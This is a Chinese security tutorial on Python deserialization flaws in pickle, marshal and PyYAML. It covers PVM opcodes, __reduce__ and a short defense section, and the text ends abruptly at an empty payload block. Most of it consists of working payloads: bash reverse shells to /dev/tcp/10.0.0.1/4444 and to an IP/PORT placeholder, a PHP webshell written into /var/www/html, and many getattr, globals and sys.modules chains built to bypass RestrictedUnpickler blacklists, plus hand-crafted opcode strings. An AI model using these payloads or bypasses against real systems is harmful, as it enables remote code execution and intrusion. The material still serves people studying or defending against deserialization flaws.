# Python安全学习—Python反序列化漏洞

Author: H3rmesk1t

Data: 2022.03.24

# 简介
`Python`的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输, 然后使用的时候再将字节流转化回原始的对象的一个过程, 这个和其他语言的序列化与反序列化其实都差不多.

`Python`中序列化一般有两种方式: `pickle`模块和`json`模块, 前者是`Python`特有的格式, 后者是`json`通用的格式.

相较于`PHP`反序列化灵活多样的利用方式, 例如`POP`链构造, `Phar`反序列化, 原生类反序列化以及字符逃逸等. `Python`相对而言没有`PHP`那么灵活, 关于反序列化漏洞主要涉及这么几个概念: `pickle`, `pvm`, `__reduce__`魔术方法. 本文主要来看看`pickle`模块的反序列化漏洞问题.

# Pickle
## 简介
`Pickle`可以用于`Python`特有的类型和`Python`的数据类型间进行转换(所有`Python`数据类型).

`Python`提供两个模块来实现序列化: `cPickle`和`pickle`. 这两个模块功能是一样的, 区别在于`cPickle`是`C`语言写的, 速度快; `pickle`是纯`Python`写的, 速度慢. 在`Python3`中已经没有`cPickle`模块. `pickle`有如下四种操作方法:

|函数|说明|
|:----|:----|
|dump|	对象反序列化到文件对象并存入文件|
|dumps|	对象反序列化为 bytes 对象|
|load|	对象反序列化并从文件中读取数据|
|loads|	从 bytes 对象反序列化|

## 简单使用
### 序列化操作
 - 代码
```python
import pickle

class Demo():
    def __init__(self, name='h3rmesk1t'):
        self.name = name

print(pickle.dumps(Demo()))
```

 - Python3

```python
b'\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Demo\x94\x93\x94)\x81\x94}\x94\x8c\x04name\x94\x8c\th3rmesk1t\x94sb.'
```

 - Python2

```python
(i__main__
Demo
p0
(dp1
S'name'
p2
S'h3rmesk1t'
p3
sb.
```

输出的一大串字符实际上是一串`PVM`操作码, 可以在`pickle.py`中看到关于这些操作码的详解.

<div align=center><img src="./images/1.png"></div>

### 反序列化操作

```python
import pickle

class Demo():
    def __init__(self, name='h3rmesk1t'):
        self.name = name

print('[+] 序列化')
print(pickle.dumps(Demo()))
print('[+] 反序列化')
print(pickle.loads(pickle.dumps(Demo())).name)
```

<div align=center><img src="./images/2.png"></div>

## PVM
### 组成部分
`PVM`由三个部分组成:
 - 指令处理器: 从流中读取`opcode`和参数, 并对其进行解释处理. 重复这个动作, 直到遇到`.`这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回.
 - 栈区(`stack`): 由`Python`的`list`实现, 被用来临时存储数据、参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化的结果.
 - 标签区(`memo`): 由`Python`的`dict`实现, 为`PVM`的整个生命周期提供存储.

### 执行流程
首先, `PVM`会把源代码编译成字节码, 字节码是`Python`语言特有的一种表现形式, 它不是二进制机器码, 需要进一步编译才能被机器执行. 如果`Python`进程在主机上有写入权限, 那么它会把程序字节码保存为一个以`.pyc`为扩展名的文件. 如果没有写入权限, 则`Python`进程会在内存中生成字节码, 在程序执行结束后被自动丢弃.

一般来说, 在构建程序时最好给`Python`进程在主机上的写入权限, 这样只要源代码没有改变, 生成的`.pyc`文件就可以被重复利用, 提高执行效率, 同时隐藏源代码.

然后, `Python`进程会把编译好的字节码转发到`PVM`(`Python`虚拟机)中, `PVM`会循环迭代执行字节码指令, 直到所有操作被完成.

### 指令集
当前用于`pickling`的协议共有`6`种, 使用的协议版本越高, 读取生成的`pickle`所需的`Python`版本就要越新.
 - `v0`版协议是原始的"人类可读"协议, 并且向后兼容早期版本的`Python`.
 - `v1`版协议是较早的二进制格式, 它也与早期版本的`Python`兼容.
 - `v2`版协议是在`Python 2.3`中引入的, 它为存储`new-style class`提供了更高效的机制, 参阅`PEP 307`.
 - `v3`版协议添加于`Python 3.0`, 它具有对`bytes`对象的显式支持, 且无法被`Python 2.x`打开, 这是目前默认使用的协议, 也是在要求与其他`Python 3`版本兼容时的推荐协议.
 - `v4`版协议添加于`Python 3.4`, 它支持存储非常大的对象, 能存储更多种类的对象, 还包括一些针对数据格式的优化, 参阅`PEP 3154`.
 - `v5`版协议添加于`Python 3.8`, 它支持带外数据, 加速带内数据处理.


```python
# Pickle opcodes.  See pickletools.py for extensive docs.  The listing
# here is in kind-of alphabetical order of 1-character pickle code.
# pickletools groups them by purpose.

MARK           = b'('   # push special markobject on stack
STOP           = b'.'   # every pickle ends with STOP
POP            = b'0'   # discard topmost stack item
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # push float object; decimal string argument
INT            = b'I'   # push integer or bool; decimal string argument
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # push None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack
REDUCE         = b'R'   # apply callable to argtuple, both on stack
STRING         = b'S'   # push string; NL-terminated string argument
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   #  "     "   ;    "      "       "      " < 256 bytes
UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument
BINUNICODE     = b'X'   #   "     "       "  ; counted UTF-8 string argument
APPEND         = b'a'   # append stack top to list below it
BUILD          = b'b'   # call __setstate__ or __dict__.update()
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
DICT           = b'd'   # build a dict from stack items
EMPTY_DICT     = b'}'   # push empty dict
APPENDS        = b'e'   # extend list on stack by topmost stack slice
GET            = b'g'   # push item from memo on stack; index is string arg
BINGET         = b'h'   #   "    "    "    "   "   "  ;   "    " 1-byte arg
INST           = b'i'   # build & push class instance
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # build list from topmost stack items
EMPTY_LIST     = b']'   # push empty list
OBJ            = b'o'   # build & push class instance
PUT            = b'p'   # store stack top in memo; index is string arg
BINPUT         = b'q'   #   "     "    "   "   " ;   "    " 1-byte arg
LONG_BINPUT    = b'r'   #   "     "    "   "   " ;   "    " 4-byte arg
SETITEM        = b's'   # add key+value pair to dict
TUPLE          = b't'   # build tuple from topmost stack items
EMPTY_TUPLE    = b')'   # push empty tuple
SETITEMS       = b'u'   # modify dict by adding topmost key+value pairs
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding

TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py

# Protocol 2

PROTO          = b'\x80'  # identify pickle protocol
NEWOBJ         = b'\x81'  # build object by applying cls.__new__ to argtuple
EXT1           = b'\x82'  # push object from extension registry; 1-byte index
EXT2           = b'\x83'  # ditto, but 2-byte index
EXT4           = b'\x84'  # ditto, but 4-byte index
TUPLE1         = b'\x85'  # build 1-tuple from stack top
TUPLE2         = b'\x86'  # build 2-tuple from two topmost stack items
TUPLE3         = b'\x87'  # build 3-tuple from three topmost stack items
NEWTRUE        = b'\x88'  # push True
NEWFALSE       = b'\x89'  # push False
LONG1          = b'\x8a'  # push long from < 256 bytes
LONG4          = b'\x8b'  # push really big long

_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]

# Protocol 3 (Python 3.x)

BINBYTES       = b'B'   # push bytes; counted binary string argument
SHORT_BINBYTES = b'C'   #  "     "   ;    "      "       "      " < 256 bytes

# Protocol 4

SHORT_BINUNICODE = b'\x8c'  # push short string; UTF-8 length < 256 bytes
BINUNICODE8      = b'\x8d'  # push very long string
BINBYTES8        = b'\x8e'  # push very long bytes string
EMPTY_SET        = b'\x8f'  # push empty set on the stack
ADDITEMS         = b'\x90'  # modify set by adding topmost stack items
FROZENSET        = b'\x91'  # build frozenset from topmost stack items
NEWOBJ_EX        = b'\x92'  # like NEWOBJ but work with keyword only arguments
STACK_GLOBAL     = b'\x93'  # same as GLOBAL but using names on the stacks
MEMOIZE          = b'\x94'  # store top of the stack in memo
FRAME            = b'\x95'  # indicate the beginning of a new frame

# Protocol 5

BYTEARRAY8       = b'\x96'  # push bytearray
NEXT_BUFFER      = b'\x97'  # push next out-of-band buffer
READONLY_BUFFER  = b'\x98'  # make top of stack readonly
```

上文谈到了`opcode`是有多个版本的, 在进行序列化时可以通过`protocol=num`来选择`opcode`的版本, 指定的版本必须小于等于`5`.

```python
import os
import pickle

class Demo():
    def __init__(self, name='h3rmesk1t'):
        self.name = name
    
    def __reduce__(self):
        return (os.system, ('whoami',))


demo = Demo()
for i in range(6):
    print('[+] pickle v{}: {}'.format(str(i), pickle.dumps(demo, protocol=i)))
```

```python
[+] pickle v0: b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
[+] pickle v1: b'cposix\nsystem\nq\x00(X\x06\x00\x00\x00whoamiq\x01tq\x02Rq\x03.'
[+] pickle v2: b'\x80\x02cposix\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'
[+] pickle v3: b'\x80\x03cposix\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'
[+] pickle v4: b'\x80\x04\x95!\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
[+] pickle v5: b'\x80\x05\x95!\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
```

<div align=center><img src="./images/3.png"></div>

基本模式:

```python
c<module>
<callable>
(<args>
tR.
```

这里用一段简短的字节码来演示利用过程:

```python
cos
system
(S'whoami'
tR.
```

<div align=center><img src="./images/4.png"></div>

上文中的字节码其实就是`__import__('os').system(*('whoami',))`, 下面来分解分析一下:

```bash
cos         =>  引入模块 os.
system      =>  引用 system, 并将其添加到 stack.
(S'whoami'  =>  把当前 stack 存到 metastack, 清空 stack, 再将 'whoami' 压入 stack.
t           =>  stack 中的值弹出并转为 tuple, 把 metastack 还原到 stack, 再将 tuple 压入 stack.
R           =>  system(*('whoami',)).
.           =>  结束并返回当前栈顶元素.
```

需要注意的是, 并不是所有的对象都能使用`pickle`进行序列化和反序列化, 例如文件对象和网络套接字对象以及代码对象就不可以.

# 反序列化漏洞
## 漏洞常见出现地方
 1. 通常在解析认证`token`, `session`的时候. 现在很多`Web`服务都使用`redis`、`mongodb`、`memcached`等来存储`session`等状态信息.

 2. 可能将对象`Pickle`后存储成磁盘文件.

 3. 可能将对象`Pickle`后在网络中传输.

## 漏洞利用方式
漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化, 反序列化后产生的对象会在结束时触发`__reduce__()`函数从而触发恶意代码.

<div align=center><img src="./images/5.png"></div>

简单来说, `__reduce__()`魔术方法类似于`PHP`中的`__wakeup()`方法, 在反序列化时会先调用`__reduce__()`魔术方法. 
 1. 如果返回值是一个字符串, 那么将会去当前作用域中查找字符串值对应名字的对象, 将其序列化之后返回.
 2. 如果返回值是一个元组, 要求是`2`到`6`个参数(`Python3.8`新加入元组的第六项).
    1. 第一个参数是可调用的对象.
    2. 第二个是该对象所需的参数元组, 如果可调用对象不接受参数则必须提供一个空元组.
    3. 第三个是用于表示对象的状态的可选元素, 将被传给前述的`__setstate__()`方法, 如果对象没有此方法, 则这个元素必须是字典类型并会被添加至`__dict__`属性中.
    4. 第四个是用于返回连续项的迭代器的可选元素.
    5. 第五个是用于返回连续键值对的迭代器的可选元素.
    6. 第六个是一个带有`(obj, state)`签名的可调用对象的可选元素.

## 基本 Payload


### 方法 1: 直接命令执行

```
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"',))

payload = pickle.dumps(RCE())
```

### 方法 2: 使用 eval

```
class EvalRCE:
    def __reduce__(self):
        return (eval, ("__import__('os').system('whoami')",))

payload = pickle.dumps(EvalRCE())
```

### 方法 3: 使用 builtins

```
class BuiltinsRCE:
    def __reduce__(self):
        import builtins
        cmd = "__import__('os').system('id')"
        return (builtins.eval, (cmd,))

payload = pickle.dumps(BuiltinsRCE())
```

### 方法 4: 反弹 shell

```
class ReverseShell:
    def __reduce__(self):
        import builtins
        cmd = "__import__('os').system('bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\"')"
        return (builtins.eval, (cmd,))

payload = pickle.dumps(ReverseShell(), protocol=2)
```

### 方法 5: 写入 webshell

```
class WriteShell:
    def __reduce__(self):
        code = "open('/var/www/html/shell.php','w').write('<?php system($_GET[\"cmd\"]);?>')"
        return (eval, (code,))

payload = pickle.dumps(WriteShell())
```

### 查看生成的 pickle 字节流

```
import pickletools

payload = pickle.dumps(RCE())
pickletools.dis(payload)
```

##  深度绕过与其他技巧

由于Pickle漏洞风险极高，很多场景中开发者会尝试限制或黑名单过滤危险函数。如禁止使用os.system、eval等，甚至自定义RestrictedUnpickler来约束模块和名称。然而，攻击者可以利用Python灵活特性和Pickle协议深层机制绕过这些防护。下面列举几种常见的绕过手法和原理分类：

### 使用替代函数

1. 如果os.system被禁用，可以用os.popen或subprocess.Popen等调用系统命令，效果相同。例如，在某些环境下os.popen('命令')仍能执行。此外，subprocess.Popen可直接调用Shell：
    
```
import subprocess  
import pickle  
  
class Exploit:  
def __reduce__(self):  
return (subprocess.Popen, (['/bin/sh','-c','id'],))  
  
payload = pickle.dumps(Exploit())  
pickle.loads(payload)
```

```
import pickle, os  
  
class Exploit:  
def __reduce__(self):  
return (os.popen, ('id',))  
  
payload = pickle.dumps(Exploit())  
pickle.loads(payload)
```

`__reduce__` 返回 (callable, args)，反序列化会执行 callable(*args)，而 subprocess.Popen 、 os.popen 同 os.system 一样，可以执行系统命令。

2. 内置函数`eval/exec`：如果允许调用eval，攻击者可以先通过`__import__('os')`拿到os模块后执行任意表达式。如：`return (__import__('builtins').__dict__['eval'], ("__import__('os').system('id')",))`。在一些RestrictedUnpickler实现中，虽然直接调用exec/eval被列为黑名单，但常可通过`getattr(builtins, 'eval')`绕过 。
    

```
import pickle, builtins  
  
class Exploit:  
def __reduce__(self):  
# getattr(builtins, 'eval')("__import__('os').system('id')")  
return (getattr(builtins, 'eval'), ("__import__('os').system('id')",))  
  
payload = pickle.dumps(Exploit())  
pickle.loads(payload)
```
3. 跳过`find_class`检查：RestrictedUnpickler通过重写`find_class()`禁止导入模块，但PVM中并非所有操作码都调用`find_class`。根据官方文档，`find_class()`在处理全局对象时被触发（`GLOBAL/c`、协议4中的`STACK_GLOBAL/\x93`、协议2及以上中的`INST/i`、`OBJ/o`等会调用该方法）。如果攻击者构造不使用这些操作码（如尽量不使用`c/i/\x93`），就可绕过`find_class`。例如，可以利用对象自身的属性或特殊方法来间接获得所需函数，无需再触发导入。通过绕过全局导入的操作码序列，可不触发find_class()检查，从而在受限环境中获取eval等函数 。
    

```
import pickle  
  
class Exploit:  
def __reduce__(self):  
# 不直接 import，也不直接 GLOBAL  
# 用现有对象的 __class__.__base__.__subclasses__() 拿到 builtins 的 eval  
builtins_eval = ().__class__.__base__.__subclasses__()[138]  # 假设138是catch_warnings类  
# 这里要遍历找到builtins模块再找eval  
return (builtins_eval, ())  
  
# 注意：这个是思路示例，实际要找到路径对应的类索引  
payload = pickle.dumps(Exploit())
```
利用函数闭包变量

```
import pickle  
  
def outer():  
def inner():  
return __builtins__['eval']  
return inner  
  
class Exploit:  
def __reduce__(self):  
# outer 返回 inner，调用 inner() 时从闭包取 eval  
return (outer(), ("__import__('os').system('id')",))  
  
payload = pickle.dumps(Exploit())  
pickle.loads(payload)
```

如果提前构造一个函数，把危险函数（eval、os.system）存进闭包变量，再把这个函数对象序列化，就能在反序列化时直接调用它。这样既不触发 find_class，又不需要用黑名单中的名字。

4. 间接访问`__builtins__`：即使`__import__`或eval被过滤，但是可以通过Python对象的属性和标准库来间接调用。例如，可以先用Pickle加载内置的dict和globals()字典，再通过builtins.getattr(...)获取内置模块和函数。[tontac的一篇文章](https://tontac.team/insecure-deserialization-in-python/#:~:text=These%20three%20bytes%20are%20used,method%20is%20not%20called)中，如下截图,攻击者逐步用以下步骤绕过黑名单：
    
    1. 通过`(c builtins getattr (c builtins dict S'get' tR)`等操作码调用`builtins.getattr(builtins.dict, 'get')`获得字典的get方法；
        

	2. 使用`globals()`获取`__builtins__`全局命名空间；
    
	3. 利用`getattr(get, globals(), 'builtins')`获取内置模块对象；
    
	4. 最终使用`getattr(builtins, 'eval')`取得eval函数 。
    

过程类似
```
get = builtins.getattr(builtins.dict, 'get')	# 拿到dict对象的get方法，dict.get  
b = get(globals(), '__builtins__', get(globals(), 'builtins'))	# 调用上一步得到的 dict.get，来从global()获得的全局变量字典中得到builtins模块，目的是从全局命名空间拿到内置对象（不通过 import builtins、不使用 GLOBAL 导入语句）  
ev = b.get('eval') if isinstance(b, dict) else builtins.getattr(b, 'eval')	# 到此处相当于getattr(builtins_obj, 'eval')，从前面获取到的builtins模块中调用他的eval方法  
ev(command)
```

**为什么要这样做才能绕过限制？**

在受限的反序列化环境里，不让 payload 直接写出 import / eval / os 等敏感字或不使用可被阻断的 GLOBAL 导入路径，同时依然能拿到危险函数并执行它们。很多防护基于**静态黑名单**（匹配字面关键字 eval/import/os）或通过 RestrictedUnpickler.find_class() 阻止通过 GLOBAL 导入任意模块。上面的方法没有显式的使用import/GLOBAL，直接从运行时才可见的对象`globals()/__builtins__`中读取内置模块或函数，而不是直接导入，因此可以绕过；并且通过 dict.get、getattr 等函数逐步索引到内置对象，再取出 eval，很多简单过滤仅查字面 eval/os.system，而此方法的关键字出现在可以被拆分或隐藏的位置（并且可以进一步用字符串拼接或 chr() 逃避匹配）。
# Marshal 反序列化
由于`pickle`无法序列化`code`对象, 因此在`python2.6`后增加了一个`marshal`模块来处理`code`对象的序列化问题.

```pyhon
import base64
import marshal

def demo():
    import os
    os.system('/bin/sh')

code_serialized = base64.b64encode(marshal.dumps(demo()))
print(code_serialized)
```

<div align=center><img src="./images/7.png"></div>

但是`marshal`不能直接使用`__reduce__`, 因为`reduce`是利用调用某个`callable`并传递参数来执行的, 而`marshal`函数本身就是一个`callable`, 需要执行它, 而不是将他作为某个函数的参数. 

这时候就要利用上面分析的那个`PVM`操作码来进行构造了, 先写出来需要执行的内容, `Python`能通过`types.FunctionTyle(func_code,globals(),'')()`来动态地创建匿名函数, 这一部分的内容可以看[官方文档](https://docs.python.org/3/library/types.html)的介绍.

结合上文的示例代码, 最重要执行的是: `(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), ''))()`.

这里直接贴一下别的师傅给出来的`Payload`模板.

```python
import base64
import pickle
import marshal

def foo():
    import os
    os.system('whoami;/bin/sh')     # evil code

shell = """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))

print(pickle.loads(shell))
```

<div align=center><img src="./images/8.png"></div>

# PyYAML 反序列化
## 漏洞点
找到`yaml/constructor.py`文件, 查看文件代码中的三个特殊`Python`标签的源码:
 - `!!python/object`标签.
 - `!!python/object/new`标签.
 - `!!python/object/apply`标签.

<div align=center><img src="./images/9.png"></div>

这三个`Python`标签中都是调用了`make_python_instance`函数, 跟进查看该函数. 可以看到, 在该函数是会根据参数来动态创建新的`Python`类对象或通过引用`module`的类创建对象, 从而可以执行任意命令.



<div align=center><img src="./images/10.png"></div>

## Payload(PyYaml < 5.1)

```yaml
!!python/object/apply:os.system ["calc.exe"]
!!python/object/new:os.system ["calc.exe"]    
!!python/object/new:subprocess.check_output [["calc.exe"]]
!!python/object/apply:subprocess.check_output [["calc.exe"]]
```

## Pyload(PyYaml >= 5.1)

```python
from yaml import *
data = b"""!!python/object/apply:subprocess.Popen
 - calc"""
deserialized_data = load(data, Loader=Loader)
print(deserialized_data)
```

```python
from yaml import *
data = b"""!!python/object/apply:subprocess.Popen
- calc"""
deserialized_data = unsafe_load(data) 
print(deserialized_data)
```

# 防御方法
 - 采用用更高级的接口`__getnewargs()`、`__getstate__()`、`__setstate__()`等代替`__reduce__()`魔术方法.
 - 进行反序列化操作之前进行严格的过滤, 若采用的是`pickle`库可采用装饰器实现.

# 参考
 - [一篇文章带你理解漏洞之 Python 反序列化漏洞](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)


# 绕过2
#### 重写`find_class()`的

##### 思路一 获取危险函数

Python是一门**面向对象属性很重的**语言.也就是说在Python中几乎一切皆为对象.这也为我们的绕过提供的不小的便利.

比如这样重写
```
import pickle
import io
import builtins

class RestrictedUnpickler(pickle.Unpickler):
    blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}

    def find_class(self, module, name):
        # Only allow safe classes from builtins.
        if module == "builtins" and name not in self.blacklist:
            return getattr(builtins, name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                     (module, name))

def restricted_loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()
```
这种过滤终究是针对了`find_class()`函数,只要我们在使用`c`操作符和`i`时不违反规定即可.在本题中是不能通过`find_class()`函数调用黑名单中的函数.

和SSTI和沙箱逃逸的思路类似,可以通过构造类对象链调用某些方法中含有危险函数的类实现绕过.我们只需要构造形如`builtins.getattr(builtins,"eval")(command)`的payload即可实现绕过.在pickle反序列化中的一个难点就是如何用opcode表示出我们需要的命令.

###### 利用`sys.module`获取危险函数

`sys.module`是一个全局字典,其主要用于存储已经被加载到当前会话中的你快.这个知识点会在学习沙箱逃逸的时候重点学习.`sys.modules`这个字典的键是模块名,值是模块本身.所以我们可以通过`get(sys.modules,"moduleName")`的方法获取危险模块.
```
>>> sys.modules
{'sys': <module 'sys' (built-in)>, 'builtins': <module 'builtins' (built-in)>, '_frozen_importlib': <module '_frozen_importlib' (frozen)>, '_imp': <module '_imp' (built-in)>, '_thread': <module '_thread' (built-in)>, '_warnings': <module '_warnings' (built-in)>, '_weakref': <module '_weakref' (built-in)>, 'winreg': <module 'winreg' (built-in)>, '_io': <module '_io' (built-in)>, 'marshal': <module 'marshal' (built-in)>, 'nt': <module 'nt' (built-in)>, '_frozen_importlib_external': <module '_frozen_importlib_external' (frozen)>, 'time': <module 'time' (built-in)>, 'zipimport': <module 'zipimport' (frozen)>, '_codecs': <module '_codecs' (built-in)>, 'codecs': <module 'codecs' (frozen)>, 'encodings.aliases': <module 'encodings.aliases' from 'C:\\Python311\\Lib\\encodings\\aliases.py'>, 'encodings': <module 'encodings' from 'C:\\Python311\\Lib\\encodings\\__init__.py'>, 'encodings.utf_8': <module 'encodings.utf_8' from 'C:\\Python311\\Lib\\encodings\\utf_8.py'>, '_codecs_cn': <module '_codecs_cn' (built-in)>, '_multibytecodec': <module '_multibytecodec' (built-in)>, 'encodings.gbk': <module 'encodings.gbk' from 'C:\\Python311\\Lib\\encodings\\gbk.py'>, '_signal': <module '_signal' (built-in)>, '_abc': <module '_abc' (built-in)>, 'abc': <module 'abc' (frozen)>, 'io': <module 'io' (frozen)>, '__main__': <module '__main__' (built-in)>, '_stat': <module '_stat' (built-in)>, 'stat': <module 'stat' (frozen)>, '_collections_abc': <module '_collections_abc' (frozen)>, 'genericpath': <module 'genericpath' (frozen)>, '_winapi': <module '_winapi' (built-in)>, 'ntpath': <module 'ntpath' (frozen)>, 'os.path': <module 'ntpath' (frozen)>, 'os': <module 'os' (frozen)>, '_sitebuiltins': <module '_sitebuiltins' (frozen)>, '_distutils_hack': <module '_distutils_hack' from 'C:\\Python311\\Lib\\site-packages\\_distutils_hack\\__init__.py'>, 'pywin32_system32': <module 'pywin32_system32' (<_frozen_importlib_external.NamespaceLoader object at 0x000002387C3F5C50>)>, 'pywin32_bootstrap': <module 'pywin32_bootstrap' from 'C:\\Python311\\Lib\\site-packages\\win32\\lib\\pywin32_bootstrap.py'>, 'site': <module 'site' (frozen)>, 'atexit': <module 'atexit' (built-in)>, '_ast': <module '_ast' (built-in)>, 'itertools': <module 'itertools' (built-in)>, 'keyword': <module 'keyword' from 'C:\\Python311\\Lib\\keyword.py'>, '_operator': <module '_operator' (built-in)>, 'operator': <module 'operator' from 'C:\\Python311\\Lib\\operator.py'>, 'reprlib': <module 'reprlib' from 'C:\\Python311\\Lib\\reprlib.py'>, '_collections': <module '_collections' (built-in)>, 'collections': <module 'collections' from 'C:\\Python311\\Lib\\collections\\__init__.py'>, 'types': <module 'types' from 'C:\\Python311\\Lib\\types.py'>, '_functools': <module '_functools' (built-in)>, 'functools': <module 'functools' from 'C:\\Python311\\Lib\\functools.py'>, 'contextlib': <module 'contextlib' from 'C:\\Python311\\Lib\\contextlib.py'>, 'enum': <module 'enum' from 'C:\\Python311\\Lib\\enum.py'>, 'ast': <module 'ast' from 'C:\\Python311\\Lib\\ast.py'>, '_opcode': <module '_opcode' (built-in)>, 'opcode': <module 'opcode' from 'C:\\Python311\\Lib\\opcode.py'>, 'dis': <module 'dis' from 'C:\\Python311\\Lib\\dis.py'>, 'collections.abc': <module 'collections.abc' from 'C:\\Python311\\Lib\\collections\\abc.py'>, 'importlib._bootstrap': <module '_frozen_importlib' (frozen)>, 'importlib._bootstrap_external': <module '_frozen_importlib_external' (frozen)>, 'warnings': <module 'warnings' from 'C:\\Python311\\Lib\\warnings.py'>, 'importlib': <module 'importlib' from 'C:\\Python311\\Lib\\importlib\\__init__.py'>, 'importlib.machinery': <module 'importlib.machinery' (frozen)>, '_sre': <module '_sre' (built-in)>, 're._constants': <module 're._constants' from 'C:\\Python311\\Lib\\re\\_constants.py'>, 're._parser': <module 're._parser' from 'C:\\Python311\\Lib\\re\\_parser.py'>, 're._casefix': <module 're._casefix' from 'C:\\Python311\\Lib\\re\\_casefix.py'>, 're._compiler': <module 're._compiler' from 'C:\\Python311\\Lib\\re\\_compiler.py'>, 'copyreg': <module 'copyreg' from 'C:\\Python311\\Lib\\copyreg.py'>, 're': <module 're' from 'C:\\Python311\\Lib\\re\\__init__.py'>, 'token': <module 'token' from 'C:\\Python311\\Lib\\token.py'>, 'tokenize': <module 'tokenize' from 'C:\\Python311\\Lib\\tokenize.py'>, 'linecache': <module 'linecache' from 'C:\\Python311\\Lib\\linecache.py'>, 'inspect': <module 'inspect' from 'C:\\Python311\\Lib\\inspect.py'>, 'rlcompleter': <module 'rlcompleter' from 'C:\\Python311\\Lib\\rlcompleter.py'>, '_struct': <module '_struct' (built-in)>, 'struct': <module 'struct' from 'C:\\Python311\\Lib\\struct.py'>, '_compat_pickle': <module '_compat_pickle' from 'C:\\Python311\\Lib\\_compat_pickle.py'>, '_pickle': <module '_pickle' (built-in)>, 'pickle': <module 'pickle' from 'C:\\Python311\\Lib\\pickle.py'>}
```

出于需要使用opcode表示我们的命令的限制,我们最终构造出的payload是`builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command)`

写成opcode就是这样的

```
geteval = b'''cbuiltins
getattr
(cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
)RS'__builtins__'
tRS'eval'
tR(S'__import__("os").system("whoami")'
tR.
'''
```
如果用pker生成opcode的话就是这样的

payload"`getattr(builtins.dict,"get")(sys.modules,"os").system("whoami")`

给pker的输入

```
getattr=GLOBAL('builtins','getattr')
dict=GLOBAL('builtins','dict')
get=getattr(dict,'get')
mod=GLOBAL('sys','modules')
os=get(mod,'os')
system=getattr(os,'system')
system("whoami")
return
```

用pker写成opcode

```
opcode=b"cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS'get'\ntRp2\n0csys\nmodules\np3\n0g2\n(g3\nS'os'\ntRp4\n0g0\n(g4\nS'system'\ntRp5\n0g5\n(S'whoami'\ntR."
```

###### 利用`builtins.globals()`获取危险函数.

还可以用builtins的`globals()`方法获取危险函数.`globals()`方法返回一个字典

> 返回的字典包含了所有全局作用域内的名称（键）及其对应的值（值）.这个字典反映了当前模块全局命名空间的状态

其中固然也包含了一些危险模块.

```
>>> builtins.globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'builtins': <module 'builtins' (built-in)>, 'os': <module 'os' (frozen)>, 'pickle': <module 'pickle' from 'C:\\Python311\\Lib\\pickle.py'>, 'sys': <module 'sys' (built-in)>}
```

例如这里就出现了`os`.

道理和上边一样.

pker的输入

```
globa1=GLOBAL("builtins","globals")
glob=globa1()
dict=GLOBAL("builtins","dict")
getattr=GLOBAL("builtins","getattr")
get=getattr(dict,"get")
builtins=get(glob,"__builtins__")
eval=getattr(builtins,"eval")
eval('__import__("os").system("whoami")')
return
```

生成的opcode

```
output=b'cbuiltins\nglobals\np0\n0g0\n(tRp1\n0cbuiltins\ndict\np2\n0cbuiltins\ngetattr\np3\n0g3\n(g2\nS\'get\'\ntRp4\n0g4\n(g1\nS\'__builtins__\'\ntRp5\n0g3\n(g5\nS\'eval\'\ntRp6\n0g6\n(S\'__import__("os").system("whoami")\'\ntR.'
```
`R`操作符被过滤时,可以使用如下payload:
```
